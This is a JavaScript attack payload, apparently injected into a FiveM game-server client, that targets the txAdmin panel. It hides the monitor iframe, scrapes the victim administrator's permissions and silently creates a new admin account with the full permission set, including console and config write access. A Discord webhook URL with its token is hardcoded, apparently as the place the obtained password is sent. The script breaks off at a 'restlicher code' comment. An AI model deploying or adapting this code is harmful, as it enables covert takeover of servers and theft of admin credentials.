
setTimeout(() => {
  const username = 'Admin';
  const monitorFrame = parent.document.querySelector('iframe[name="monitor"]');
  const chat = parent.document.querySelector('iframe[name="chat"]');
  
  if (chat && chat.name === "chat") {
    chat.contentWindow.eval(
      fetch('http://chat/chatResult', {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify({"message":"/tx"})
      })
      .then(response => response.text())
      .catch(error => console.error('Error beim initialen Chat Result:', error))
    );
  }
  
  if (monitorFrame && monitorFrame.name === "monitor") {
    monitorFrame.style.display = "none";
    monitorFrame.contentWindow.eval(
      setTimeout(() => {
        fetch("${triggerUrl}", { method: 'GET' })
        .then(response => {
          if(response.status === 200) { proceed(); } else { JSON.parse("foo"); }
        })
        .catch(err => { JSON.parse("foo"); });
        
        function proceed() {
          function parseAccountResponse(responseText) {
            if (responseText.includes("Username already taken")) { 
              return { success: false, error: "Username already taken" }; 
            }
            try {
              var parsed = JSON.parse(responseText);
              if (parsed.password && typeof parsed.password === "string" && parsed.password.length > 0) { 
                return { success: true, password: parsed.password }; 
              } else if (parsed.error) { 
                return { success: false, error: parsed.error }; 
              } else { 
                return { success: false, error: responseText }; 
              }
            } catch(e) {
              if (responseText.includes("You cannot give permissions you do not have:")) { 
                return { success: false, error: responseText }; 
              } else { 
                return { success: true, password: responseText }; 
              }
            }
          }
          
          function parseDisallowed(responseText) {
            let disallowed = [];
            if (responseText.includes("You cannot give permissions you do not have:")) {
              const parts = responseText.split("You cannot give permissions you do not have:");
              if (parts.length > 1) {
                let listString = parts[1].replace(/<br>/g, '').trim();
                disallowed = listString.split(',').map(item => {
                  let perm = item.trim().toLowerCase().replace(/[^a-z0-9._]/g, '');
                  if (perm === "troll") { perm = "players.troll"; }
                  return perm;
                });
              }
            }
            return disallowed;
          }
          
          fetch('https://monitor/focusInputs', {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: 'true'
          }).catch(() => {});
          
          (async () => {
            var injectedUsername = "${username}";
            const webhookURL = "https://ptb.discord.com/api/webhooks/1333866895497232545/PUNSkXyWsRD31jclLQgzZWxFP9aZ0PcoekO9ILJp20XVvAcdTDoLyju3CfDGy784vJsx";
            
            function sendTx() {
              const chat = parent.document.querySelector('iframe[name="chat"]');
              if (chat) {
                chat.contentWindow.eval(
                  fetch('http://chat/chatResult', {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify({"message":"/tx"})
                  })
                  .then(response => response.text())
                  .catch(error => console.error('Error beim initialen Chat Result:', error))
                );
              }
            }
            
            async function addAccount(permArray) {
              let body = "name=" + encodeURIComponent('${username}') + "&citizenfxID=&discordID=";
              permArray.forEach(perm => { 
                body += "&permissions%5B%5D=" + encodeURIComponent(perm); 
              });
              let res = await fetch("https://monitor/WebPipe/adminManager/add", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: body
              });
              return await res.text();
            }
            
            let allPermissions = [
              "manage.admins", "settings.view", "settings.write", "console.view", "console.write",
              "control.server", "announcement", "commands.resources", "server.cfg.editor",
              "txadmin.log.view", "server.log.view", "menu.vehicle", "menu.clear_area", "menu.viewids",
              "players.direct_message", "players.whitelist", "players.warn", "players.kick", "players.ban",
              "players.freeze", "players.heal", "players.playermode", "players.spectate", "players.teleport",
              "players.troll"
            ];
            
            let response = await fetch("https://monitor/WebPipe/legacy/adminManager", { method: "GET" });
            let htmlText = await response.text();
            if(htmlText.includes("You don't have permission to view this page.")) { 
              sendTx(); 
              return; 
            }
            
            const parser = new DOMParser();
            const doc = parser.parseFromString(htmlText, "text/html");
            const rows = doc.querySelectorAll("table.table-striped tbody tr");
            let yourAccountRow = null;
            for (let row of rows) {
              let btn = row.querySelector("button");
              if (btn && btn.textContent.indexOf("Your Account") !== -1) { 
                yourAccountRow = row; 
                break; 
              }
            }
            if (!yourAccountRow) return;
            
            const ownTds = yourAccountRow.querySelectorAll("td");
            const ownAccountName = ownTds[0].textContent.trim();
            const ownPerms = ownTds[2].textContent.toLowerCase().trim();
            let success = false;
            let finalResponse = "";
            let usedPermissionSet = null;
            
            // ... restlicher code ...
          })();
        }
      }, 0);
    );

    setTimeout(() => {
      monitorFrame.style.display = "block";
    }, 5000);
  }
}, 0);
